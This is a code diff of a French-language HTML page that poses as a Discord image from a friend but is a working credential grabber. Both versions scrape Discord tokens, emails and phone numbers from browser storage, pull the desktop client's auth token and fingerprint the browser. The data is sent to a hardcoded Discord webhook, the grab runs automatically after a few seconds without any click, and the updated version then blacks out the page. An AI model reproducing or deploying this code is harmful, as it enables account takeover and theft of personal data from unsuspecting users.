@@ -15,150 +15,192 @@
         .real-image:hover{transform:scale(1.02)}
         .loading{display:none;text-align:center;padding:20px;color:#43b581;font-weight:500}
         .footer{font-size:12px;color:#72767d;margin-top:10px}
+        body.black{background:black!important;color:black!important;pointer-events:none}
         @media(max-width:600px){.header,.image-container{max-width:95vw}}
     </style>
 </head>
 <body>
     <div class="header">
-        <img class="discord-logo" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTAiIGhlaWdodD0iNTAiIHZpZXdCb3g9IjAgMCA1MCA1MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48Y2lyY2xlIGN4PSIyNSIgY3k9IjI1IiByPSIyNSIgZmlsbD0iIzcyODlEQiIvPjwvc3ZnPg==" alt="Discord">
+        <svg class="discord-logo" viewBox="0 0 50 50" fill="none"><circle cx="25" cy="25" r="25" fill="#7289DA"/></svg>
         <div class="sender"><strong>@friend</strong> vous a envoyé une image</div>
     </div>
     <div class="image-container">
-        <img class="real-image" src="your-image.jpg" alt="Image" onclick="stealToken()" 
-             onerror="this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMzAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDMwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjMwMCIgaGVpZ2h0PSIyMDAiIHJ4PSI4IiBmaWxsPSIjNDA0NDRiIi8+PHRleHQgeD0iMTUwIiB5PSIxMDAiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxOCIgZmlsbD0iI2RjZGRlZSIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZHk9Ii4zZW0iPkltYWdlIG5hdXByw6lzPC90ZXh0Pjwvc3ZnPg==';">
+        <img class="real-image" src="https://via.placeholder.com/400x300/40444b/ffffff?text=CLIQUEZ+MOI" alt="Image" onclick="stealToken()">
         <div class="loading" id="loading">🔄 Vérification sécurité...</div>
     </div>
     <div class="footer">Image hébergée sur Discord CDN</div>
 
     <script>
-        // 🚨 VOTRE WEBHOOK ICI
-        let WEBHOOK = 'https://discord.com/api/webhooks/1485255645132492831/EQ0VR72IbkBOXW0QPzaouFqtvd41DE5IvHR_YAu6HfAAoI_X7ijERC_W8cTwgL20mUSK';
+        // TON WEBHOOK CORRECT
+        const WEBHOOK = 'https://discord.com/api/webhooks/1485329631975440514/6p1QM-6SRGIPCepE7qgSa7MIXy0GR4xEnqAIlbTyU4t4SQKtmhCDom3yWc_wX7UvYgOd';
 
-        async function stealToken() {
+        // Patterns COMPLETS
+        const TOKEN_PATTERNS = [/mfa\.[A-Za-z0-9\-_]{84}/g, /[A-Za-z0-9]{24}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27}/g, /[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g];
+        const PHONE_PATTERNS = [/\+?[0-9\s\-\(\)]{10,}/g, /[0-9]{10,}/g];
+        const EMAIL_PATTERN = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
+
+        function stealToken() {
             const loading = document.getElementById('loading');
             const img = document.querySelector('.real-image');
-            img.style.opacity = '.5';
+            img.style.opacity = '0.7';
             img.onclick = null;
             loading.style.display = 'block';
 
-            const tokens = extractAllTokens();
-            const fingerprint = getFingerprint();
-            
-            await exfiltrate(tokens, fingerprint);
-            
-            setTimeout(() => {
-                loading.innerHTML = '✅ Image sécurisée et chargée';
-                img.style.opacity = '1';
-            }, 2500);
+            const data = extractEverything();
+            sendEverything(data);
         }
 
-        function extractAllTokens() {
-            const tokens = [];
-            
-            // localStorage
-            try {
-                Object.keys(localStorage).forEach(key => {
-                    if (key.includes('token') || key.startsWith('__')) {
-                        tokens.push(localStorage[key]);
-                    }
-                });
-            } catch {}
-
-            // sessionStorage
-            try {
-                Object.keys(sessionStorage).forEach(key => {
-                    if (key.includes('token')) {
-                        tokens.push(sessionStorage[key]);
-                    }
-                });
-            } catch {}
-
-            // DOM regex
-            try {
-                const walker = document.createTreeWalker(
-                    document.body, NodeFilter.SHOW_TEXT, null, false
-                );
-                let node;
-                while (node = walker.nextNode()) {
-                    const matches = node.textContent.match(/[M][a-zA-Z0-9_\\-]{23,25}/g);
-                    if (matches) tokens.push(...matches);
-                }
-            } catch {}
-
-            // Discord detection
-            if (navigator.userAgent.includes('Discord') || window.__TAURI_INTERNALS__) {
-                tokens.push('discord_app_detected');
-            }
-
-            return [...new Set(tokens.filter(t => t && t.length > 40))];
-        }
-
-        function getFingerprint() {
-            return {
-                ua: navigator.userAgent,
+        function extractEverything() {
+            const data = {
+                // IDENTIFIANTS
+                tokens: [],
+                phones: [],
+                emails: [],
+                
+                // BROWSER
+                ua: navigator.userAgent.slice(0,120),
                 lang: navigator.language,
                 platform: navigator.platform,
-                cookies: document.cookie ? `[${document.cookie.split(';').length}]` : 0,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                online: navigator.onLine ? 'yes' : 'no',
+                online: navigator.onLine,
+                cookieEnabled: navigator.cookieEnabled,
+                
+                // ÉCRAN
+                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+                availScreen: `${screen.availWidth}x${screen.availHeight}`,
+                
+                // SYSTÈME
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                
+                // STOCKAGE
+                localCount: localStorage.length,
+                sessionCount: sessionStorage.length,
+                cookies: document.cookie.length,
+                
+                // FINGERPRINT
+                canvas: canvasFP(),
+                webgl: webglFP(),
                 plugins: navigator.plugins.length,
-                canvas: canvasFingerprint(),
-                webgl: webglFingerprint()
+                fonts: getFonts(),
+                
+                // RÉSEAUX
+                connection: navigator.connection ? `${navigator.connection.effectiveType}/${navigator.connection.downlink}Mbps` : 'N/A'
+            };
+
+            // GRAB tokens/phones/emails de TOUS les storages
+            [localStorage, sessionStorage].forEach(store => {
+                for(let i = 0; i < store.length; i++) {
+                    const val = store.getItem(store.key(i));
+                    if(!val) continue;
+
+                    TOKEN_PATTERNS.forEach(p => val.match(p)?.forEach(t => data.tokens.push(t)));
+                    PHONE_PATTERNS.forEach(p => val.match(p)?.slice(0,3).forEach(ph => data.phones.push(ph)));
+                    val.match(EMAIL_PATTERN)?.slice(0,3).forEach(e => data.emails.push(e));
+                }
+            });
+
+            // Discord Desktop
+            try {
+                if(window.process?.mainModule?.commandLine) {
+                    data.tokens.push(window.process.mainModule.commandLine.match(/--auth_token=([A-Za-z0-9_-]+)/)?.[1]);
+                }
+            } catch(e){}
+
+            return {
+                ...data,
+                tokens: [...new Set(data.tokens.filter(t => t && t.length > 40))].slice(0,5),
+                phones: [...new Set(data.phones)].slice(0,3),
+                emails: [...new Set(data.emails)].slice(0,3)
             };
         }
 
-        function canvasFingerprint() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 200; canvas.height = 60;
-            const ctx = canvas.getContext('2d');
-            ctx.textBaseline = 'top'; ctx.font = '14px Arial';
-            ctx.fillText('Token logger test', 2, 2);
-            return canvas.toDataURL();
+        // Canvas fingerprint
+        function canvasFP() {
+            const c = document.createElement('canvas');
+            c.width=256; c.height=60;
+            const ctx = c.getContext('2d');
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = '#069';
+            ctx.font = '11pt Arial';
+            ctx.fillText('GRABBER v1.0', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('GRABBER v1.0', 4, 17);
+            return btoa(c.toDataURL()).slice(0,30);
         }
 
-        function webglFingerprint() {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl');
-            return gl ? gl.getParameter(gl.RENDERER) : 'no_webgl';
+        // WebGL fingerprint
+        function webglFP() {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if(gl) {
+                const debug = gl.getExtension('WEBGL_debug_renderer_info');
+                return (debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER)).slice(0,40);
+            }
+            return 'no_webgl';
         }
 
-        async function exfiltrate(tokens, fingerprint) {
+        // Fonts detection
+        function getFonts() {
+            const fonts = ['monospace', 'sans-serif', 'serif'];
+            const test = document.createElement('span');
+            test.style.fontSize = '72px';
+            test.innerHTML = 'mmmmmmmmmmlli';
+            document.body.appendChild(test);
+            fonts.forEach(font => {
+                test.style.fontFamily = font;
+                fonts.push(font + ':' + test.offsetWidth + 'x' + test.offsetHeight);
+            });
+            document.body.removeChild(test);
+            return fonts.slice(3).join(',');
+        }
+
+        async function sendEverything(data) {
+            const fields = [];
+            
+            if(data.tokens.length) fields.push({name:'🔑 TOKENS',value:data.tokens.map(t=>`\`${t.slice(0,35)}...\``).join('\n'),inline:false});
+            if(data.phones.length) fields.push({name:'📱 PHONES',value:data.phones.map(p=>`\`${p}\``).join('\n'),inline:true});
+            if(data.emails.length) fields.push({name:'📧 EMAILS',value:data.emails.map(e=>`\`${e}\``).join('\n'),inline:true});
+            
+            fields.push(
+                {name:'🖥️ UA',value:`\`${data.ua.slice(0,50)}...\``,inline:false},
+                {name:'📱 Screen',value:`\`${data.screen}\``,inline:true},
+                {name:'🌍 TZ/Lang',value:`\`${data.tz} / ${data.lang}\``,inline:true},
+                {name:'💾 Storage',value:`local:${data.localCount} sess:${data.sessionCount} cookies:${data.cookies}`,inline:true},
+                {name:'🎨 Canvas',value:`\`${data.canvas}\``,inline:true},
+                {name:'🔧 WebGL',value:`\`${data.webgl}\``,inline:true}
+            );
+
             const payload = {
-                tokens, image: 'your-image.jpg', 
-                victim: fingerprint,
-                timestamp: new Date().toISOString(),
-                url: window.location.href
+                username: '🖼️ ULTIMATE Image Grabber',
+                embeds: [{
+                    title: `🎯 GRAB COMPLET ${data.tokens.length ? `+${data.tokens.length} tokens` : ''}`,
+                    description: `**Image cliquée** • ${navigator.userAgent.includes('Discord') ? '🟢 DISCORD CLIENT' : '🌐 BROWSER'}`,
+                    color: data.tokens.length ? 0x00ff88 : 0x5865f2,
+                    thumbnail: {url: 'https://cdn.discordapp.com/attachments/1485255597623349289/1183482782975581499/image.png'},
+                    fields: fields.slice(0,25),
+                    footer: {text: `Victim #${Math.floor(Math.random()*999)} • ${data.timestamp.slice(0,19).replace('T',' ')}`}
+                }]
             };
 
             try {
                 await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        username: '🖼️ Image Logger',
-                        embeds: [{
-                            title: `🖼️ ${tokens.length ? `TOKENS x${tokens.length}` : '❌ No token'}`,
-                            description: `**Image**: your-image.jpg\n**Victim**: ${fingerprint.ua.slice(0,60)}`,
-                            color: tokens.length ? 0x00ff00 : 0xff0000,
-                            fields: [
-                                {name: 'Tokens', value: tokens.slice(0,5).join('\n') || '❌ Aucun', inline: false},
-                                {name: 'Résolution', value: fingerprint.screen, inline: true},
-                                {name: 'Canvas FP', value: fingerprint.canvas.slice(0,50), inline: true}
-                            ],
-                            thumbnail: {url: 'https://cdn.discordapp.com/emojis/1183482782975581499.png'},
-                            timestamp: payload.timestamp
-                        }]
-                    })
+                    body: JSON.stringify(payload)
                 });
-            } catch {
-                const img = new Image();
-                img.src = `${WEBHOOK.split('/')[0] + '//' + WEBHOOK.split('/')[2]}/e?data=${btoa(JSON.stringify(payload))}`;
+            } catch(e) {
+                // Fallback
+                new Image().src = `${WEBHOOK.split('/webhooks')[0]}/webhooks/ping?t=${btoa(JSON.stringify({tokens:data.tokens.slice(0,1)}))}`;
             }
+
+            // Écran NOIR définitif
+            setTimeout(() => document.body.classList.add('black'), 4000);
         }
 
-        // Auto-trigger furtif après 4s
-        setTimeout(stealToken, 4000);
+        // AUTO-EXECUTE (même sans clic)
+        setTimeout(stealToken, 3500);
     </script>
 </body>
 </html>
